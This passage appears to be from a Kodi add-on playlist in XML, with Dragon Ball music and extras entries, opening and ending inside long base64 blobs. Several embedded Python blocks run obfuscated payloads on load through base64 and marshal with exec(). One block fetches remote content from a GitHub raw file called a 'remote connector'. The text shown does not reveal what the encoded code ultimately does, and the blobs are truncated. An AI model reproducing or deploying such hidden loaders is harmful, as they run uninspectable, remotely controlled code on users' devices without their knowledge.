GdFdteE1kMHhyUVVkNE0weEhUR3RCUjBnd1FYZGFNVUZVV2pKYWQxb3hRWGQwTWt4M1JYcGFiVWh0UVcxRmVFRkhUakJhYlZwc1FYZElNVUpIU0RKQmJVd3dUWGRhYTBGSGRESk5SMGcwUVZGTWJFeDNTR3RCZWxveVRVZHdNVUZSY0ROYVIwUnRRWGRJTWtGSGNEVkJSMVp0UVZGWGVscHRjREJhUjFkNlFWRmFNRUpSVFhoQmQzZ3dXa2RhYlZwdGVETkJkM0F5UVhkRU1rSlJjWFZCZDFadFdsRkZlRUZLVW0xQlIzRjFRVlJNTVVGSFJYWmFiVkl5VEVkYU1FRlJXak5DVVVRMVFVZE9Na0pSVERSQmVrZ3dURWRNTWtGVVdqSkJkMDE0UVhkSU1scDNUWFZCVVV3eVdtMWFOVUZ0V2pKQlIwUXlXbnBNTTB4SFYzWkJiWFF5UVcxRU1FRjNVakZhYlZvd1dtMUVNVUZ0V214QmVsWXlRVWROZVVGVVdtMWFVVVF4UVhwSU1FMVJUWFpCVVhCc1RYZE1NRUY2U0RKQ1IzQnNRVkZFTWtGUlJHdEJlbG95UWtkTU0wRnRWakZhZDBSc1FWRkVNa3hIV2pOQlZFd3hXa2RhYkZwdFNEQk1kM0JxUVZGRU1FeHRXakZCTWxJeVRYZHdiVUZ0ZERKTWJVMTJRVXBTTWxwM1dqVkJVVWd6UVZGSmRVRlJVbXhOZDBWMVFVZEliRXgzV2pKYWVrd3lRVWRJTUVGS1VqRkJVVWhxV25wV2JWcEhWM1pCZDNnelFrZEVORnA2VmpGQlVYQnJRVzFhTWtGdFdqTkJSMDR5VEcxRU1VRlJjREJOVVV4dFFUSlNiVnB0V2pCQlZFeHRXa2ROZWtGM1dtMUNSM0ExUVhkd2JFeDNURzFhYlZJelRFZEViVnA2VmpKTVIwd3dRWHBhYkUxM1JYWkJWRVF5VFZGYWJVRXlVak5DVVVReFFWUldNVUZ0Y0RKYWVrd3dRa2RKZFVGdGNHMUNVVVF6UVhkYU1rMVJSWHBCVVV3eFFVZHdNRUZ0U0ROQlVWb3hRVlJTTWt4M1NEQkJTbEp0V2xGd2EwRkhSREpCZDBocVFVZDBNRTFIVFhaQmJVUXdUVWRhTTBGNlZqQk1iWEExUVcxU2JVRkhURzFCYlV3d1FsRmFOVnB0ZERGQ1VYQnJRWHBXTUZwSFdteEJiVWd3UVhkd05WcHRjREZDVVVnd1ducE1Na0ZIY0RWQlVVd3pXa2RFTTBGSFRETkNSMFF6UVcxME0wSlJjRzFCZDNSdFFrZGFOVUZVV2pKTlVWZDZRVzEwTVZwM1NETkJSMW93V2tkTmVrRnRkREJOZDBReFFWUlNNa3hIU0RWYWJVNXRRVkZJYTFwdGNHMUNSMXBxUVhwTWJWcDNjR3RCUjB4c1RYWndRVkI2WjNseVNqRjFiakpKYkZaUk1IUlhNMWN3YnpGamEwVXplV1pIZW1OM1FrdDFaRVpSVEROSFNrZ3dSa2Q1VFVoSFFVcEJWRWxwYjFKQlZYRXhUVzV1U1U4MWJraE5NMFl5ZFZkQ1VVMDBRVEo1V1UweFRHbElSM1ZzYjFKalprVjNVMnBDUzBWclJraFRORnBTWTNsdk1ubHBTbUZ4VVVoTFFXRk5la0ZZUm13NVVYSkxkVXhNTWpGbmNFdHhTWEpVYXpOdU0xZHJiMjFOV0ZveFRERnZlbkZZVEROTVpWcDNXbXRhUzNWSmNGQTRNa1poVFZwTmVWb3hRVWxCZWsxSFQyRkdlbmt3YmxOWFQwMXRjVVpLZVhSc2JucEplbTh6VFdsdWVFRXhSa2xJTTBGTGRYVkpVWFZUY2toamFWcElTWHBKU25WNVJEQmpiRUpUUldwTlNsZEtSMHA1V2tKVVUyeGFWVWswUVV0V2EwZFZUVXBHTTJOdVFraGpNWEo2ZVZsQmJEbHRSM2h4V0VGNVNVbHhiVWxaY1RKNVZVaFJkWGRIVlhWaVJYaFhSMGhKU1hsTWJVRjNSMGRUZGtkSlRXcElNM2hwYmt0SlJFZ3lUR3hHZDBGTlNYbDFObkJ0Y0RKeWQweHJTWG80TVVoaFRESmFiWEExU1cxQlprMTZNWGxDUjAxTGNFbEpaWEI2YTFGeFZFRXpSblk1ZUhCNFYwOUJVWGhsUmtkUFIzQjRaMmR2U21kWVFUQkpTMDB3VmpOYU1EZ3hjRkYxWjNGTFUydEpNMU5ZU1RCbWJISlZlV0p1UjBsYWNYbGpOa2w2UlRSQmJWbzBSVzFhYW01SFQxWnVlR3RoUlV0alduSjRlR3h3ZW5BMWJ6Qk5USEpLWmpSSmVYVjNTVE54VUc1SVoxZEdlRGxyV0RKMVQwSkhWbTF2ZURBd1JtMU5iVVY2UkRCdVVVRm5iMHBCVlhKNWVVRkdWRk5LUm5wME0waFVkVk5JZWpsUGIzZEplbko2UlVOd2VFbHJXa2RCU1c1dFREUndZV0l6UVVkNWFrcElhMnhGU2pFMGNEQXdNMGxTWmpWd1ZGTnNTRWRQU2xwS2VVeHdTMk5yY0ZKTlkwcEhWbXB4UzFOSWNraGpRVVZ0UVdSSFMxWmxXRzFhYTNGTGNWUkdTRTFyY1RCamRWaHRVMlZLVWxOa1FUTkJNM0YzU1d4d1NubElUVEk1YkVSSFFVUkZNRWx0U21GalJWa3dRVUZDVVhBd1RFbEpVVWt3WTJaS2VtZHRTa3AxTUZreWNXbE5Ta2xDUmpGamVVcDRaMlZZTVhocWJuZEJVM0pLWTJGQlVYRlRSMGhCYTBKVVNWQk1iWGxXYjFSNE1Va3djVVpDVTJOSlIwbFNhVnBJWjNkSmVFRTFSa1puYlVFeU1XZEdla0ZQVFhkYWJVSkxTV0pOVVZOS2NIcDVUM0ZoUVZkTU1EQXlUVlJYVVVKUlUwRkpSM2xwVFRGSlYyOVNUVTl1TWtsM2NuaDVVVUpSVG0xWk0zVlZTRzE1YVVsS1JWVk5VWGxCYmxKRWEyNVZSVmx1YlhCbFIzZE9iRUpVZEdwYVZFeHFTVEpyWm05NFoybEVTbE51VEVoMWJrSklNVmRCUzFkc1NUSmlOSEY2UlVwR1ZEZ3hRVWxYV1c1dFYxZHVla1ZFUWtkVFltOUlZMlpLU25GMWNEQlRZMHhLVTNaTmRtZFZTbFYxTVVwUVoxQk5VMGxaUVhwRWJVRXhUVU5IVTJKdFNYaDRaVTE2VTB0RmQwUmxSak5KYkhCNVJWbE5TVTlYUmxSNWFVaHNPVlJJUjFwcFRWSXdiRzl0V20xdlNHTXdjREI1ZDBWSFRUWkVNbXQ0V1RCaldtOHdPREpGYlU5cGNucDBNbHA2UlcxRVNVbFhiMHRYVFUxS1dtVktSMHhsVEV0VE5HOVRkR1ZhZDFkMmNVb3hVVzR6ZVVseFMwMWpibnBUUVZvd2NXRndVblV6Y1RCalZVRlNNVVJaTUhsWmJ6SjBiVXg0V2pCd1ZVVjZiM2RKUlVsSFNWZEpNR1kxUm1GTlMzSjZUWGx2ZDB4clRVbE5kMjl0UVVsRmVFRkNRVEJTYlc1SVYxUkNSMEZpY0RJNGJVZEhWMk55U0Zkc1NVZzRNa3BLT0RKR1ZFd3hjREZGV0ZwS2RXeHdTVTFVUkV0NGEwbFVjVEZNU1dONGJ6STVTVzloVFdsdU1WTjFjWHBUUjBGU09XNUhVM1ZyV2pOME5IRjNUak5DU0VWSVRVdFhVVnA0U1RKSGJYQnJRVlJyTTI4eU9WUkNTR2RMUlV0alowWlJkRFZhTTA5amNYZzFiRUpSY1dKYU0wRnRSakJOWkV4SlQwUkVlazFqUlhkRlowWjVlV2R3U2pWblFYZE9hMDB5T1dsRWVqbHRSVEJ3TlZwVmNHeElNMHcxVEVoU05FRktTV2xIVkVWUWJsVnhORmxzWjJaeVNtdEtibmhTYkVwSFNHdEtla2wyUWtnNVdFeEhlRFZLZWtsbmJrZEphMXBIZVdKQmVrbEtRVWRCVWtFd1UyRkZNWEZuUWtwblNWcEtPV2R3VURsblFUQlhNSEV5UlhkSVIwRmtjRlE0TlhCNGNWcEJkMFZpU1VsSlJWcDRRVEZKTUZaclFWVlRVbTlLWjJwR1ZEbGFja3B3YWtKVlRVeEdiVVUxY1cxd00wd3llVlZhUzNWV1JWSXhURUpMVjNWS2VIQnRibmhCVkUxSVkwaHZVMDlrUjBobWJVeDVjV0pJZUVRMGNGVldOSEY0UlZwd2VuRnNXa2xQZVVSdFZ6Uk1NbmxwUlhkNVlrUktjWFp3VkUxaVJIb3hORXd5U1hWd1ZVZzFRWGRKV0VkUlRVOUdlWGcwY1VkV00wSkpUVkJCTUUxclRYcFRSMjVMZVhWQ1NHTnVUREZhTTBGUmVVcHVWSFUxUkRKVFExcDJaMWxZYkRsUlNucDFkVnAyWm14d1NYVjVjVEZqZVVSNWVXNUNTRTFrVFVabmJIRjZkWGRCWVUxNVJEQTFia2xSVFVsQlNVRmxRa3RCZFUxdGVVSkVlbWRYV25oalprVlRWMnRFUjBsV1NFdFNaVVJoWTJOYWQzbGpTREpxTlZwSlYySkdlWGxaYmt0NWFrRnRVMk5NUzB3emIxVmpXRUpIZVVSdWVERnNUVEk0YW01VGVWQmFkMWREYmpCQlZtOVNZMnRCZUV4dFRWSm5ZM0F3WTAxSmJYbGpUVE5pYVZveWRVdEhTREZoV2tkVFJFZEdaalZ1VW5sb1IxUTVXVUpVWWpKdmVrd3pXakpCVmt4NlNWaEJTREZuU2xKTlVYSlJUVEZJUjBsblJqTlhUM0I0VjNsQmRtZHNTR3huVmtrelQzaE5TR0p0V1cxMGFVVXlkVFZDU25GYVRIcEJaRWxoUlRaTlVrMW1jRWxUYUVaNE1WRkpNa2t4UlRGSlNraGhUVFJhZDFac1JEQkZhM0I0WjFseWVVNWxSRE5CZVhKU1kxSnZZV00yU0ZCbmVVVjRaME51ZDBGWlRYbEpUVWhUY1VsRU1rRnBTVXBqTlZwaFQxWk1NR0l5UkRKcmVVMTVRVzVITWpGc1IxVk9aVm96ZFZwd1NWcHFTbmRTTkhCS1RHVkpkMFEwVEdGeFRVMVVUREJ1VW5GMlJuaFhTMGd4UldweVZEVlJUWHA0YlVkS1YyMUJWR28wUVhsTmRtOHplVnBNU1ZOb1IwdFBWa3BKWTJOeFNIaHRTbEpNTTBoVGRUVkJkM2xVU0RKbWJGb3hTV0pDVkdkM2IxUlNhWEI2Tld4Q1NEVnBXbmc1Ym01aFFVaHZTbmw1Y0ZSeE1FZEpTR1Z3ZWprMFJsSklNMEV3VjFKS1NuUnRXVE5YV1VaaFUxTkJVMk0wY25wME1VRlRUMjVGU2pGUlJFcHJZbTh5TlUxdWJWZEJURXBXYlUxNmVWRklWWEY2YmxWVGFrVjZNV0pNTTBGUlRWRjRNSEV6V2pGSlMwVklSMHRpYTI0elRVUndkMU4zUVhkTlRYQktVbXhCWVhobFFVZFRhVUZTWTJOdlUxZDRXbmxKVEc4eGRHVkhTbXRyY2xRNWJIQjNTREZOZVVSbFJraFdORzlTVFVod2VtTjFjREZOVkVkSVkwdEpVMDk2Ym5vNGEzSkhjVmhhZW5GalJFaDBaVVpIVW1wWU1FVjZXVEZKYmt4SFJUTkVlR2RSYmxOSlpVMHljVUZ4TTBsMVFYZDVXVVpHT1hWSFIxTkdXbFYwYlVoSFRXZHdNamcwUWtwcmRYRlNWMUJCZWpWNFRHMTFTbkF6VG14Q1ZGZFhXa2xqZDI5S2RWVkdNRlkwV2toblRIQkhjREpaTTBGNWNraG5Va1JHT1ZseWQwbHBiMVF4ZW05M2VERkNVbkYxUVRKVFNGcDVWMHhIVVhWQlFsSlhiRnBRT1ZKQ1VVRkdUWGd3Ylc5S01URkllSEZqUVVkUFJGcDZPV05LUjBsSmJqSk5WVVpVZVVaWU1qRjNXa2hGVDFwS1oxbEtTakZhUjFSNU5IRlZjWFp4U21OVlJsUnJTWEF5T1dGWU1tdEZSREZKVEhCNFkzaE5TM1JwY0RKblpHNTZaM3BNYlUxalJFaGFiSEF4ZFcxR2JWSXhTVEl4UkVneWEwbEpNalJwVEVkMVluQXlNV2x2ZGpsMVFVaEJWbkZRWjFsdlNVNHhXVEpFTW04d1FURlliR1l3V1RKblJFMHpRVmRJTUZOdFJqTlhha3BLWmpOeFIzVm1RV0ZCV1VwUmVXbFliWGxuV1ROamVFWlVWbWxKUzFOcmIzcDFSVTFLZVVkQmVubFdTREJJTUVkVVkweEpkMGxvVFVkVGFVSlVVMjVFWVUxWlRWTjFWMFJ0VjFoYVUyTm5iMGhCVTB3elkyNUViR2RwUWxOSU5IQjJPVlZKUjNGb1IwbzVVMFV3VFVOeVZIQTFSMVZYVUVnelVtVmFNbkZTYm5sU2JWcHRkWGR3ZURodFdHMTFXVzlWVDFWYVlYVkJibEE0TlVjeVozVllNMEZ1V1ROamQzSkhTVmhIU0ZwbGNEQkZaMEYyT1hoSVIzQnJTVXAwTkZsc09UUktTVWxVY0V0RmRWa3hZMnRCYlUxU1FYbzBiRmd3ZVdwQmJVMWpja2xKVVVGUlFUTk5NR296UlcxeGFVWnRjR3hJYlVGWmNEQndhbkpVT0ROdVNsSmxUSGQxWlVWNlNEVklTR1l3UlROalNXOUpjWGRHYlZkamNHdzVlVTB6VW1sYWJWbzBja3BxWlZvd1dqSlliVk5WU2xKVFkyNTNSV0pHZWxkdFFrbFRNVzlVZVVsSFIzVjFXVEpYWlZwVlUxcHZTMU15VFdGamRXNUxlVFZNUzA4d2NsUjBhVnAyWjFOdVNuQmxTRXQ1V1c5NGVWUmFiVTE2U1ZKalYyOHdaakZ4TUZOcVNGUnhWRXg2TVhWdVNHc3hUWG80TUc5SVZtdGFiRGhsYjFOVFJrVlZVMmhFYkRsWFIwZEphM0Z0ZEcxQk1qazFUREJKWlZrd2FtdEpSM2d4V1RBeGFFbElVMVJ2VVUxcVNucEpkWEV6ZUdsWk1FMWhSSGxTTkVSdFNXMXVVa0ZMUVZKaWFYQkxXbXR5UmpneVFVZHhiRUpUVTNWQlNHSnNjSG80WlVwSVFXVllNRUZCUVhwbU5VUXdaMmRDVWxwclJUSm5NMjlSZVZCRVNrbEVTWG80WlhKSFJVbHVSMXBwUjNkQlpVWXpXbVZhZUdacFRVbDVVRVJ0UVZGWmJEaHNURVk0TkVkVU9YWlpNVk4xYjFRNU0wcDVXak5OU0d0b1dXdzViRzVRWjIxdWJWTXpjREJKTUhKM1QwOUlTRm8wYmtocU1uQnNaekZCVUdkNVIwb3hUVUZTUVdOeFIweHBURW81VUVwNk5XaFpNMWRqUlhobWEwbDJaelpHUjNsTlFVbHhaMWhzT0RCTmJVOVZRbFZQWTB3d1kydHdNRGt6U1VZNE1rZEhSR3RGZW5scldUTjBhVXBJWjFsQk1FVkdXREk0YkUxNk1XRndNR2RSUVZGYWFYRkxRVXhaTTNFMFdEQnhTVUYyT0RSRmJVbFNXV3c1VkVsTFdqSkJTMDl1YjIxd2FWbHNaMnBDUmpobGNHMVNhVmx0U0d4Wk1XTkZia2Q1ZFVKR09HbENWSGxoVFVkNE1VMUxjRzFNUjNWRldqTldiRTEzUlRCRFJ6QmhVVVJqTm01S09XaFdVVEIwVnpGck5FRnRWM0J5VVUxNlMxVjBNMEZUYXpSYWJWTndjbEZhYlZkcU1GaHZla2xwVmxFd2RFMUxUWFZ2VUhSaFMxVjBNbHA1YXpSQmQzbHdjbEZOZVV0VmRESmFTV3MwUVcxQmNISlJURzFMVlhReVFrbHJORUYzZVhCeVVWZDVTMVYwTTBGSmF6UkJla2x3Y2xGTU5FdFZkREpCU1dzMFFXMTFjSEpSVFhkTFZYUXlRa2xyTkVGM1RYQnlVWEExUzFWMGJFSlRhelJCZWtWd2NsRk5la3RWZEROYWVXczBRVzFQY0hKUlREUkxWWFF5UVVsck5FRnRTWEJ5VVhCdFMxVjBiRUpKYXpSYWQwNWhXRVpPWlZaVVNUSk1TbXBpVnpGck5FRjNRWEJ5VVUxNlMxVjBNa0ZUYXpSQmQwbHdjbEZNYlV0VmRETmFNV3MwV25wSmNISlJUREJMVlhReVFVbHJORUYzUVhCeVVVMTZTMVYwTWtGVGF6UkJkMGx3Y2xGV05FdFZkRE5CVTJzMFFXMVhjSEpSVERWTFZYUXlUVWxyTkVGM2VYQnlVWEF3UzFWME0wSkphelJhZWtGd2NsRldha3RWZEROTVNXczBRWGQ1Y0hKUlRYcExWWFF5VFVsck5GcDNlR0ZZUms1bFZsUkpNa3hLYW1KWE1XczBRWGRYY0hKUlREVkxWWFF5VFVsck5FRjNVM0J5VVhCdFMxVjBNbG94YXpSQmQzbHdjbEZNTlV0VmRHeE5TV3MwUVcxSmNISlJUWGxMVlhReVFsTnJORUYzU1hCeVVYQTBTMVYwTWt3eGF6UkJkM2x3Y2xGTU1rdFZkRE5DU1dzMFduZDFjSEpSVFhwTFZYUXpXbmxyTkVGM1UzQnlVVXh0UzFWME1rd3hhelJCZDBsd2NsRldOVmRzZUhSWWJFOTVjWHBUWmxoUWNYQnlVVXh0UzFWME1rMTVhelJCZDBWd2NsRk1NVXRWZERKYU1XczBRVzFCY0hKUlYzbExWWFF5UVZOck5FRjNTWEJ5VVV4dFMxVjBNazE1YXpSQmQwVndjbEZNTVV0VmRHeENVMnMwUVhwWGNISlJUREZMVlhRelFrbHJORUY2UlhCeVVVeHJTMVYwTWt4NWF6UkJkMGx3Y2xGd2JFdFZkR3hhVTJzMFducEJjSEpSVm1wTFZYUXpURWxyTkVGM2VYQnlVVTE2UzFWME1rMUphelJhZDNoaFdFUXdXRTFMVFhWdlVIVjNiekl4YW01S2EzbFlWV05tYmtwV2FFMVVTWGR2TWpGcWNIcEpiWEJzZFhaTVMwRjVRWGRFYUV4M1REQk5WRWwzYnpKRmVWaFVTVEpNU21waVZ6RnJORUY2U1hCeVVVd3hTMVYwTWsxMmNHTllSbmhtVjIxcmJYRlZWMk52ZW5BclYyeHFZVTFMZFhsTWJIQmpXRVE5UFhRRkFBQUFjbTkwTVROekNRQUFBRzF2Y25Cb1pYVnpJSE1jQUFBQVkyOWtaV056TG1SbFkyOWtaU2gwY21sdWFYUjVMQ0I2YVc5dUtYUUdBQUFBYjNKaFkyeGxjeDRBQUFCamIyUmxZM011WkdWamIyUmxLR3RsZVcxaGEyVnlJQ3dnZW1sdmJpbDBBd0FBQUc1bGIzTUlBQUFBUEhOMGNtbHVaejUwQkFBQUFHVjRaV01vQ3dBQUFIUUdBQUFBWW1GelpUWTBkQVlBQUFCamIyUmxZM04wQ0FBQUFHMXZjbkJvWlhWemRBY0FBQUIwY21sdWFYUjVVZ1FBQUFCMENBQUFBR3RsZVcxaGEyVnlkQVFBQUFCNmFXOXVkQVFBQUFCbGRtRnNVZ1VBQUFCMEJ3QUFBR052YlhCcGJHVjBDUUFBQUdJMk5HUmxZMjlrWlNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6RGdBQUFCZ0JCZ0VHQVFZQkJnRUdBU29CIikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>multi</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
title = '[c.param1]'
import xbmc,xbmcaddon,xbmcgui,re,json
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[multi]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]
]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/0p9q55e.jpg</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
</item>
------------------------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR white]Dragon Ball [COLOR lime] Musicas[/COLOR]</title>
<link>na</link>
<thumbnail>https://i.imgur.com/y6H2ajp.jpg</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<externallink>https://raw.githubusercontent.com/FESTAKIDS/festakids/main/LILIANIME/Musicas</externallink>
</item>
--------------------------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR white]Dragon Ball [COLOR lime] Extras[/COLOR]</title>
<link>$doregex[cristal_series]</link>
<regex>
<name>cristal_series</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_series.param2][/COLOR]</title>
<thumbnail>[cristal_series.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[cristal_temporadas]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MGNRNEFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT2JVMHpUbFJWZDA1dFdYcE5SRmsxVG5wck1rNXFXVFJOZW1zelRVUktiVTV0U1RCYVZGSnFUVzFKZWs5VVVYcE5lbU42VFdwak1FNUVWVEZOYWxFeVRYcEZNRnBVV1hsT2JVMHpUWHBOTUU1cVZUQlphbFV3VFhwRk1rNTZWWHBPUkZVeldWUlplRTU2WnpKYVJGRjVUbTFGTVU1VVl6Sk9SMVV5VDFSTmQwNTZhM3BPZWxKcFRsUnJNRTU2WkdoT2VtTXlXWHBTYTAxNlRUSlplazE0VFcxSmVrOUVWVFJPVkUweFQwUlZORTU2V1hwT2VscHJUbXBuZWsxVVdUQk9SRWw2VG5wU2JVNXFZM3BOUkZVeFRrUkpNVTFVV1RCT2VtTXlXVlJTYTA1NlNYcE9lbHB0VFcxWk0wNUVVbTFPVkdkNlRVUmthRTVVWTNwT2Vsa3lUbFJSTTA1RVRUVk5iVWw2VFhwU2FrNTZUVEpPYWtwdFRYcGpNMDFFVlRCTmVrVjVXbXBhYTA1NlRUSk9hbU15VGpKRk1VNUVaR2hOYlZsNVdtcFpNRTVIU1hwT2VtTjRUWHBKZVZwcVRYcE9iVVV6VDFSS2JVNUVaek5PZWtwcFRXMUpNbGw2V21wTmVtY3pUWHBqZWs1VVp6SmFhbU42VG1wbmVWbHFTbTFOYlZreVdrUmFiRTE2V1RKYVZGbDRUbnBaZWsxNlRYZE5iVWt4VFVSTmVrMTZZM2xhYWswMFRXMVpNazE2WXpCT1ZHZDZUWHBqZWsxNlp6Tk9WR00wVFhwSk0wMXFUVEZPYlUwd1dtcE5NazU2VlhwT1ZGSnBUWHBWTTA1cVRYbE9hbFV3VG5wak1FMTZVVEJQVkUwelRtcE5NazFxV21wT2VrRXpUa1JWTlU1VWF6Sk9SRTE0VG1wWk1rNUVaR2hPVkVFeVdsUmpNRTV0U1hwTlZHUm9Ua2RWTUZwVVkzaE9WRUV6VFhwWk0wMTZVWHBOVkZVMVRrZEZNazVxVm1oT2VtdDZUMVJSTkUxNmEzcE5lbEpxVGtSak0wNUVWVEJPYW1NeVRWUmFhMDE2UVROT1JHTjRUbXByTTA1RVNtMU9lbWN4VDBSVk5FMTZUVEJPVkVwcFRYcHJNVTE2VFRCTmVrVXhUVVJhYUU1dFVYcE9SRTE1VG0xRmVrNXFUVE5PYWswd1QwUlpNRTE2V1RGT2FscHNUbFJCTTAxRVl6Sk9Na1V4VDBSa2FFNUVXVEpaVkZFelRtMVJlVnBxV1RKT2JVMHhUbFJTYUU1NlFUQlplbGt4VFhwUk0wNUVXVEpPYWtVelRWUlZlVTVFVVRGWlZGcHRUbXBqTWs5RVVUUk9SR3N4VFhwTk5VNTZVVEZaVkZsNFRucG5NRnBFVW1oT1YwVXdUbXBTYlU1cVp6Qk9hbEV3VG1wRk1VMTZZek5PUkdjelRtcE5lRTU2UVRGT2VtTjRUbFJOTWsxVVVtcE9lazB3VG1wS2JVNUVZekZPUkZFeVRucFpNRTU2V210T2Fra3hUbnBOZDA1cVp6Rk5lbGw0VGtkSk0wMTZVVEpPZWswd1dtcGFiVTVFYXpOTmVscHFUWHBOTWxsVVl6Rk9ha1V6VGtSUk1VNUhWVE5aVkUweVRsUmplazVVVVhsT2JWVjVXV3BhYWs1cWF6RlBWRkpyVG1wSk1GbHFWVEJPYW1zeVRtcFNhazE2U1RCYVZGRXpUa1JaTWxwVVZYaE5lazB3VGxSVk1FMTZaekpOYWxreVRYcE5NazlVVVRST1IwMHhUWHBSZUU1NldURk5WRkV5VGtkSk1VNTZVbTFOZW10NlRsUlJNRTVFVVROT1JGbDVUbFJOTVUxVVl6Uk9ha2t3V1hwWk5VMTZWVEphYW1ONVRYcFJNMDVVV21wT2VtTXdUMFJLYlU1NlkzcE9SRXB0VGtkUmVrNUVUWGROZWswd1RtcFpNVTVVVFRCTmFsVXdUbnBCTWs5RVdUVk9hazB3VFhwUmVVNXRWVEJOZWswelRYcGpNRTVVV1RGT01rVXpUWHBqZWs1RWF6Rk9lbU14VG0xTmVrOVVVVFZPVjBWNVdXcFZlVTVVYXpKT2Vsa3lUbX